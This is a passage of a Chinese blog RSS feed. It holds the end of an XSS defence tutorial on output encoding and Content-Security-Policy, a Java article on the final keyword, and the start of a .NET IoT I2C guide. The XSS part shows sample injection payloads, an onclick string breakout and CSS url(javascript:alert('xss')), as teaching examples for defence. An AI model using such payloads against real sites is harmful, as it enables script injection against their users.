  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如上代码，我们继续点击xxx测试的时候，还是可以弹窗的。&lt;/p&gt;
&lt;p&gt;现在如果我们继续将$value进行JavaScript编码：显示正常，不存在XSS。 如下代码所示：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=utf-8&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;referrer&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;never&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;test&quot;&lt;/span&gt;&lt;span&gt; onclick&lt;/span&gt;&lt;span&gt;=&quot;testFunc('hello\x20world\x27\x29\x2calert\x28\x27onclick\x20xss')&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;xxs测试&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;function&lt;/span&gt;&lt;span&gt; testFunc() {}
    
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt;&lt;span&gt; str &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;hello world'),alert('onclick xss&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 使用正则表达式实现html编码&lt;/span&gt;
    &lt;span&gt;function&lt;/span&gt;&lt;span&gt; encodeForJavascript(str) {
      let encoded &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;''&lt;/span&gt;&lt;span&gt;;
      &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt;(let i &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;; i &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt; str.length; i&lt;/span&gt;&lt;span&gt;++&lt;/span&gt;&lt;span&gt;) {
        let cc &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; hex &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; str[i];
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (&lt;/span&gt;&lt;span&gt;!&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;[A-Za-z0-9]&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;.test(str[i]) &lt;/span&gt;&lt;span&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span&gt; str.charCodeAt(i) &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt; &lt;span&gt;256&lt;/span&gt;&lt;span&gt;) {
          hex &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;\\x&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;+&lt;/span&gt;&lt;span&gt; cc.charCodeAt().toString(&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;&lt;span&gt;);
        }
        encoded &lt;/span&gt;&lt;span&gt;+=&lt;/span&gt;&lt;span&gt; hex;
      }
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; encoded;
    };
    console.log(encodeForJavascript(str)); 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; hello\x20world\x27\x29\x2calert\x28\x27onclick\x20xss&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们继续点击就没有任何反应了，大家自己可以试试下。因此就不会存在xss攻击了。&lt;/p&gt;

&lt;p&gt;XSS 防御之 URL 编码&lt;/p&gt;
&lt;p&gt;作用范围：将不可信数据作为 URL 参数值时需要对参数进行 URL 编码&lt;br/&gt;编码规则：将参数值进行 encodeURIComponent 编码&lt;/p&gt;
&lt;p&gt;编码代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; encodeForURL(str){
  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; encodeURIComponent(str);
};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;XSS 防御之 CSS 编码&lt;/p&gt;
&lt;p&gt;作用范围：将不可信数据作为 CSS 时进行 CSS 编码&lt;br/&gt;比如：通过css构造（background-img:url\expression\link-href@import）&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;style&lt;/span&gt;&lt;span&gt;=&quot;background-image: url(javascript:alert('xss'));&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;style&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;{&lt;/span&gt;&lt;span&gt;background-image&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; url(&quot;javascript:alert('xss')&quot;)&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;}&lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;style&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;编码规则：除了字母数字字符以外，使用\XXXXXX格式来转义ASCII值小于256的所有字符。 编码代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; encodeForCSS (attr, str){
  let encoded &lt;/span&gt;= ''&lt;span&gt;;
  &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (let i = 0; i &amp;lt; str.length; i++&lt;span&gt;) {
    let ch &lt;/span&gt;=&lt;span&gt; str.charAt(i);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!ch.match(/[a-zA-Z0-9]/&lt;span&gt;) {
      let hex &lt;/span&gt;= str.charCodeAt(i).toString(16&lt;span&gt;);
      let pad &lt;/span&gt;= '000000'&lt;span&gt;.substr((hex.length));
      encoded &lt;/span&gt;+= '\\' + pad +&lt;span&gt; hex;
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
      encoded &lt;/span&gt;+=&lt;span&gt; ch;
    }
  }
  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; encoded;
};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;开启CSP网页安全政策防止XSS攻击&lt;/p&gt;
&lt;p&gt;Content-Security-Policy 中文的意思是 网页安全政策，&lt;/p&gt;
&lt;p&gt;CSP是网页安全政策(Content Security Policy)的缩写。主要用来防止XSS攻击。是一种由开发者定义的安全性政策申明，通过CSP所约束的责任指定可信的内容来源，通过 Content-Security-Policy 网页的开发者可以控制整个页面中 外部资源 的加载和执行。&lt;br/&gt;比如可以控制哪些 域名下的静态资源可以被页面加载，哪些不能被加载。这样就可以很大程度的防范了 来自 跨站(域名不同) 的脚本攻击。&lt;/p&gt;
&lt;p&gt;如何使用呢？&lt;/p&gt;
&lt;p&gt;我们只需要在meta属性中设置下即可：如下代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;http-equiv&lt;/span&gt;&lt;span&gt;=&quot;Content-Security-Policy&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;比如如下的列子：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;http-equiv&lt;/span&gt;&lt;span&gt;=&quot;Content-Security-Policy&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;
default-src http: https:  *.xxx.com 'self' 'unsafe-inline' ;
style-src 'self' 'unsafe-inline' *.yyy.com;
script-src 'self' 'unsafe-inline' 'unsafe-eval' ;
&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;默认设置（default-src）：信任 http ,https协议资源，信任当前域名资源，信任符合*.xxx.com的域名资源CSS设置（style-src）：信任当前域名资源，允许内嵌的CSS资源，信任来自*.yyy.com下的CSS资源。&lt;br/&gt;JS设置（script-src）：信任当前域名资源，允许内嵌的JS执行，允许将字符串当作代码执行&lt;/p&gt;
&lt;p&gt;有如下类别&lt;/p&gt;
&lt;p&gt;default-src 给下面所有的规则设定一个默认值&lt;br/&gt;script-src 外部脚本&lt;br/&gt;style-src 样式表&lt;br/&gt;img-src 图像&lt;br/&gt;media-src 媒体文件（音频和视频）&lt;br/&gt;font-src 字体文件&lt;br/&gt;object-src 插件（比如 Flash）&lt;br/&gt;child-src 框架&lt;br/&gt;frame-ancestors 嵌入的外部资源（比如、&amp;lt;iframe&amp;gt;、和）&lt;br/&gt;connect-src HTTP 连接（通过 XHR、WebSockets、EventSource等）&lt;br/&gt;worker-src worker脚本&lt;br/&gt;manifest-src manifest 文件&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;script-src有如下属性值：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;unsafe-inline 允许执行页面内嵌的&amp;lt;script&amp;gt;标签和事件监听函数&lt;br/&gt;unsafe-eval 允许将字符串当作代码执行，比如使用eval、setTimeout、setInterval和Function等函数&lt;br/&gt;nonce 每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行&lt;br/&gt;hash 列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行&lt;/p&gt;
</description>
<pubDate>Wed, 22 May 2019 15:30:00 +0000</pubDate>
<dc:creator>龙恩0707</dc:creator>
<og:description>web安全之XSS攻击原理及防范</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/tugenhua0707/p/10909284.html</dc:identifier>
</item>
<item>
<title>探究final在java中的作用 - 炭烧生蚝</title>
<link>http://www.cnblogs.com/tanshaoshenghao/p/10908771.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/tanshaoshenghao/p/10908771.html</guid>
<description>&lt;blockquote readability=&quot;11&quot;&gt;
&lt;p&gt;final关键字的字面意思是最终的, 不可修改的. 这似乎是一个看见名字就大概能知道怎么用的语法, 但你是否有深究过final在各个场景中的具体使用方法, 注意事项, 以及背后涉及的Java设计思想呢?&lt;/p&gt;
&lt;/blockquote&gt;


&lt;h2 id=&quot;基础-final修饰基本数据类型变量和引用数据类型变量.&quot;&gt;1. 基础: final修饰基本数据类型变量和引用数据类型变量.&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;相信大家都具备基本的常识: 被final修饰的变量是不能够被改变的. 但是这里的&quot;不能够被改变&quot;对于不同的数据类型是有不同的含义的.&lt;/li&gt;
&lt;li&gt;当final修饰的是一个基本数据类型数据时, 这个数据的值在初始化后将不能被改变; 当final修饰的是一个引用类型数据时, 也就是修饰一个对象时, 引用在初始化后将永远指向一个内存地址, 不可修改. 但是该内存地址中保存的对象信息, 是可以进行修改的.&lt;/li&gt;
&lt;li&gt;上一段话可能比较抽象, 希望下面的图能有助于你理解, 你会发现虽说有不同的含义, 但本质还是一样的.&lt;/li&gt;
&lt;li&gt;首先是final修饰基本数据类型时的内存示意图&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190522153415318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTM1Nzc2Nw==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;如上图, 变量a在初始化后将永远指向003这块内存, 而这块内存在初始化后将永远保存数值100.&lt;/li&gt;
&lt;li&gt;下面是final修饰引用数据类型的示意图&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/2019052215343156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTM1Nzc2Nw==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;在上图中, 变量p指向了0003这块内存, 0003内存中保存的是对象p的句柄(存放对象p数据的内存地址), 这个句柄值是不能被修改的, 也就是变量p永远指向p对象. 但是p对象的数据是可以修改的.&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 代码示例
public static void main(String[] args) {
    final Person p = new Person(20, &quot;炭烧生蚝&quot;);
    p.setAge(18);   //可以修改p对象的数据
    System.out.println(p.getAge()); //输出18

    Person pp = new Person(30, &quot;蚝生烧炭&quot;);
    p = pp; //这行代码会报错, 不能通过编译, 因为p经final修饰永远指向上面定义的p对象, 不能指向pp对象. 
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;不难看出final修饰变量的&lt;strong&gt;本质&lt;/strong&gt;: final修饰的变量会指向一块固定的内存, 这块内存中的值不能改变.&lt;/li&gt;
&lt;li&gt;引用类型变量所指向的对象之所以可以修改, 是因为引用变量不是直接指向对象的数据, 而是指向对象的引用的. 所以被final修饰的引用类型变量将永远指向一个固定的对象, 不能被修改; 对象的数据值可以被修改.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;进阶-被final修饰的常量在编译阶段会被放入常量池中&quot;&gt;2. 进阶: 被final修饰的常量在编译阶段会被放入常量池中&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;final是用于定义常量的, 定义常量的好处是: 不需要重复地创建相同的变量. 而常量池是Java的一项重要技术, 由final修饰的变量会在编译阶段放入到调用类的常量池中.&lt;/li&gt;
&lt;li&gt;请看下面这段演示代码. 这个示例是专门为了演示而设计的, 希望能方便大家理解这个知识点.&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public static void main(String[] args) {
    int n1 = 2019;          //普通变量
    final int n2 = 2019;    //final修饰的变量

    String s = &quot;20190522&quot;;  
    String s1 = n1 + &quot;0522&quot;;    //拼接字符串&quot;20190512&quot;
    String s2 = n2 + &quot;0522&quot;;    

    System.out.println(s == s1);    //false
    System.out.println(s == s2);    //true
}&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;10&quot;&gt;
&lt;p&gt;首先要介绍一点: 整数-127-128是默认加载到常量池里的, 也就是说如果涉及到-127-128的整数操作, 默认在编译期就能确定整数的值. 所以这里我故意选用数字2019(大于128), 避免数字默认就存在常量池中.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;&lt;li&gt;上面的代码运作过程是这样的:&lt;/li&gt;
&lt;li&gt;首先根据final修饰的常量会在编译期放到常量池的原则, n2会在编译期间放到常量池中.&lt;/li&gt;
&lt;li&gt;然后s变量所对应的&quot;20190522&quot;字符串会放入到字符串常量池中, 并对外提供一个引用返回给s变量.&lt;/li&gt;
&lt;li&gt;这时候拼接字符串s1, 由于n1对应的数据没有放入常量池中, 所以s1暂时无法拼接, 需要等程序加载运行时才能确定s1对应的值.&lt;/li&gt;
&lt;li&gt;但在拼接s2的时候, 由于n2已经存在于常量池, 所以可以直接与&quot;0522&quot;拼接, 拼接出的结果是&quot;20190522&quot;. 这时系统会查看字符串常量池, 发现已经存在字符串20190522, 所以直接返回20190522的引用. 所以s2和s指向的是同一个引用, 这个引用指向的是字符串常量池中的20190522.&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;&lt;li&gt;当程序执行时, n1变量才有具体的指向.&lt;/li&gt;
&lt;li&gt;当拼接s1的时候, 会创建一个新的String类型对象, 也就是说字符串常量池中的20190522会对外提供一个新的引用.&lt;/li&gt;
&lt;li&gt;所以当s1与s用&quot;==&quot;判断时, 由于对应的引用不同, 会返回false. 而s2和s指向同一个引用, 返回true.&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;总结: 这个例子想说明的是: 由于被final修饰的常量会在编译期进入常量池, 如果有涉及到该常量的操作, 很有可能在编译期就已经完成.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;探索-为什么局部匿名内部类在使用外部局部变量时-只能使用被final修饰的变量&quot;&gt;3. 探索: 为什么局部/匿名内部类在使用外部局部变量时, 只能使用被final修饰的变量?&lt;/h2&gt;
&lt;blockquote readability=&quot;10&quot;&gt;
&lt;p&gt;提示: 在JDK1.8以后, 通过内部类访问外部局部变量时, 无需显式把外部局部变量声明为final. 不是说不需要声明为final了, 而是这件事情在编译期间系统帮我们做了. 但是我们还是有必要了解为什么要用final修饰外部局部变量.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class Outter {
    public static void main(String[] args) {
        final int a = 10;
        new Thread(){
            @Override
            public void run() {
                System.out.println(a);
            }
        }.start();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;在上面这段代码, 如果没有给外部局部变量a加上final关键字, 是无法通过编译的. 可以试着想想: 当main方法已经执行完后, main方法的栈帧将会弹出, 如果此时Thread对象的生命周期还没有结束, 还没有执行打印语句的话, 将无法访问到外部的a变量.&lt;/li&gt;
&lt;li&gt;那么为什么加上final关键字就能正常编译呢? 我们通过查看反编译代码看看内部类是怎样调用外部成员变量的.&lt;/li&gt;
&lt;li&gt;我们可以先通过javac编译得到.class文件(用IDE编译也可以), 然后在命令行输入&lt;code&gt;javap -c .class文件的绝对路径&lt;/code&gt;, 就能查看.class文件的反编译代码. 以上的Outter类经过编译产生两个.class文件, 分别是&lt;code&gt;Outter.class和Outter$1.class&lt;/code&gt;, 也就是说内部类会单独编译成一个.class文件. 下面给出&lt;code&gt;Outter$1.class&lt;/code&gt;的反编译代码.&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Compiled from &quot;Outter.java&quot;
final class forTest.Outter$1 extends java.lang.Thread {
  forTest.Outter$1();
    Code:
       0: aload_0
       1: invokespecial #1                  // Method java/lang/Thread.&quot;&amp;lt;init&amp;gt;&quot;:()V
       4: return

  public void run();
    Code:
       0: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;
       3: bipush        10
       5: invokevirtual #3                  // Method java/io/PrintStream.println:(I)V
       8: return
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;定位到&lt;code&gt;run()&lt;/code&gt;方法反编译代码中的第3行:&lt;/li&gt;
&lt;li&gt;&lt;code&gt;3: bipush 10&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;我们看到a的值在内部类的&lt;code&gt;run()&lt;/code&gt;方法执行过程中是以压栈的形式存储到本地变量表中的, 也就是说在内部类打印变量a的值时, 这个变量a不是外部的局部变量a, 因为如果是外部局部变量的话, 应该会使用&lt;code&gt;load&lt;/code&gt;指令加载变量的值. 也就是说系统以拷贝的形式把外部局部变量a复制了一个副本到内部类中, 内部类有一个变量指向外部变量a所指向的值.&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;&lt;li&gt;但研究到这里好像和final的关系还不是很大, 不加final似乎也可以拷贝一份变量副本, 只不过不能在编译期知道变量的值罢了. 这时该思考一个新问题了: 现在我们知道内部类的变量a和外部局部变量a是两个完全不同的变量, 那么如果在执行run()方法的过程中, 内部类中修改了a变量所指向的值, 就会产生数据不一致问题.&lt;/li&gt;
&lt;li&gt;正因为我们的原意是内部类和外部类访问的是同一个a变量, 所以当在内部类中使用外部局部变量的时候应该用final修饰局部变量, 这样局部变量a的值就永远不会改变, 也避免了数据不一致问题的发生.&lt;/li&gt;
&lt;/ul&gt;

&lt;ul&gt;&lt;li&gt;使用final修饰方法有两个作用, 首要作用是锁定方法, 不让任何继承类对其进行修改.&lt;/li&gt;
&lt;li&gt;另外一个作用是在编译器对方法进行内联, 提升效率. 但是现在已经很少这么使用了, 近代的Java版本已经把这部分的优化处理得很好了. 但是为了满足求知欲还是了解一下什么是方法内敛.&lt;/li&gt;
&lt;li&gt;方法内敛: 当调用一个方法时, 系统需要进行保存现场信息, 建立栈帧, 恢复线程等操作, 这些操作都是相对比较耗时的. 如果使用final修饰一个了一个方法a, 在其他调用方法a的类进行编译时, 方法a的代码会直接嵌入到调用a的代码块中.&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;//原代码
public static void test(){
    String s1 = &quot;包夹方法a&quot;;
    a();
    String s2 = &quot;包夹方法a&quot;;
}

public static final void a(){
    System.out.println(&quot;我是方法a中的代码&quot;);
    System.out.println(&quot;我是方法a中的代码&quot;);
}

//经过编译后
public static void test(){
    String s1 = &quot;包夹方法a&quot;;
    System.out.println(&quot;我是方法a中的代码&quot;);
    System.out.println(&quot;我是方法a中的代码&quot;);
    String s2 = &quot;包夹方法a&quot;;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;在方法非常庞大的时候, 这样的内嵌手段是几乎看不到任何性能上的提升的, 在最近的Java版本中，不需要使用final方法进行这些优化了. --《Java编程思想》&lt;/li&gt;
&lt;/ul&gt;

&lt;ul&gt;&lt;li&gt;使用final修饰类的目的简单明确: 表明这个类不能被继承.&lt;/li&gt;
&lt;li&gt;当程序中有永远不会被继承的类时, 可以使用final关键字修饰&lt;/li&gt;
&lt;li&gt;被final修饰的类所有成员方法都将被隐式修饰为final方法.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt; &lt;br/&gt; &lt;/p&gt;
&lt;ul&gt;&lt;li&gt;参考资料&lt;/li&gt;
&lt;li&gt;https://www.cnblogs.com/ChenLLang/p/5316662.html&lt;/li&gt;
&lt;li&gt;http://www.cnblogs.com/xrq730/p/4857820.html&lt;/li&gt;
&lt;li&gt;https://gitbook.cn/books/5c6e1937c73f4717175f7477/index.html&lt;/li&gt;
&lt;li&gt;http://www.cnblogs.com/xrq730/p/4844915.html&lt;/li&gt;
&lt;li&gt;http://www.cnblogs.com/dolphin0520/p/3811445.html&lt;/li&gt;
&lt;li&gt;https://www.cnblogs.com/dolphin0520/p/3736238.html&lt;/li&gt;
&lt;/ul&gt;&lt;hr/&gt;
&lt;ul&gt;&lt;li&gt;最后欢迎关注我的&lt;strong&gt;免费&lt;/strong&gt;知识星球, 我会在星球中持续更新系统的Java后端面试题分析, 将会囊括Java基础知识到主流框架原理. 还会分享关于编程的趣味漫画.&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://www.cnblogs.com/images/cnblogs_com/tanshaoshenghao/1426602/o_%e6%98%9f%e7%90%832.png&quot;/&gt;</description>
<pubDate>Wed, 22 May 2019 13:51:00 +0000</pubDate>
<dc:creator>炭烧生蚝</dc:creator>
<og:description>[toc] final关键字的字面意思是最终的, 不可修改的. 这似乎是一个看见名字就大概能知道怎么用的语法, 但你是否有深究过final在各个场景中的具体使用方法, 注意事项, 以及背后涉及的Jav</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/tanshaoshenghao/p/10908771.html</dc:identifier>
</item>
<item>
<title>张高兴的 .NET Core IoT 入门指南：（三）使用 I2C 进行通信 - 张高兴</title>
<link>http://www.cnblogs.com/zhanggaoxing/p/10908670.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhanggaoxing/p/10908670.html</guid>
<description>&lt;h2 id=&quot;什么是-i2c-总线&quot;&gt;什么是 I&lt;sup&gt;2&lt;/sup&gt;C 总线&lt;/h2&gt;
&lt;p&gt;I&lt;sup&gt;2&lt;/sup&gt;C 总线（Inter-Integrated Circuit Bus）是设备与设备间通信方式的一种。它是一种串行通信总线，由飞利浦公司在1980年代为了让主板、嵌入式系统或手机用以连接低速周边设备而发展&lt;sup&gt;&lt;a href=&quot;https://baike.baidu.com/item/iic/3524834&quot;&gt;[1]&lt;/a&gt;&lt;/sup&gt;。I&lt;sup&gt;2&lt;/sup&gt;C 总线包含两根信号线，一根为信号线 SDA ，另一根为时钟线 SCL 。总线上可以挂载多个设备，以 7 位 I&lt;sup&gt;2&lt;/sup&gt;C 地址为例，总线上最多可以挂载 2&lt;sup&gt;7&lt;/sup&gt; - 1 个设备，即 127 个，地址 0x00 不用（类似于网络中的广播地址）。I&lt;sup&gt;2&lt;/sup&gt;C 还包括一个子集叫 SMBus （System Management Bus），是 1995 年由 Intel 提出的&lt;sup&gt;&lt;a href=&quot;https://baike.baidu.com/item/SMBus/1190006&quot;&gt;[2]&lt;/a&gt;&lt;/sup&gt;。为什么说是子集，是因为 SMBus 是 I&lt;sup&gt;2&lt;/sup&gt;C 的简化版，电气特性和传输速率等方面上略有不同。下图展示了一个 I&lt;sup&gt;2&lt;/sup&gt;C 主设备和三个 I&lt;sup&gt;2&lt;/sup&gt;C 从设备的示意图，总线上只能有一个主设备，而通常情况下你的主机（如 Raspberry Pi，Arduino）就是主设备，传感器为从设备。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1085877/201905/1085877-20190522213235190-237434343.png&quot;/&gt;&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;&lt;small&gt;图源：&lt;a href=&quot;https://zh.wikipedia.org/wiki/File:I2C.svg&quot;&gt;Wikipedia&lt;/a&gt;&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;I&lt;sup&gt;2&lt;/sup&gt;C 总线也并不是那么完美。因为 I&lt;sup&gt;2&lt;/sup&gt;C 只有两根信号线，与 SPI 的四根信号线相比，传输速率上并不占优，而且数据在同一时间内只能向一个方向传输。但反过来看，I&lt;sup&gt;2&lt;/sup&gt;C 总线的最大优点是只需要占用两个 IO 接口，在单片机等 IO 接口数量较少的设备上也算是一种优势吧。&lt;/p&gt;
